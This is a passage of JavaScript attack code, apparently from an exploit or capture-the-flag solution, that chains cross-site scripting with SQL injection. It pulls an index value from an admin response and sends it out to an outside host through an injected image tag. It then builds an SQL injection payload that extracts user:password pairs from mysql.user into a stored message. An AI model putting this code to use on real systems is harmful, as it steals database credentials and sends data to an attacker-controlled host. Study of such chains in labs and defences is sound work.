...
var idx = xhr.responseText.match('index=(\\w+)')[1];

document.write("<img src='http://ibrahim-elsayed.com/IDXIDXIDX?" + escape(idx) + "' />");

xhr.open("GET", "/admin/read.php?index=" + idx, false);
var sqli = "', `is_read` = 0, `content` = (SELECT group_concat(user,0x3a,password) from mysql.user) WHERE `message`.`index` = 'st5mNqM4dkLs8IfyP6Tz2zQanN1kOBMG' # ";
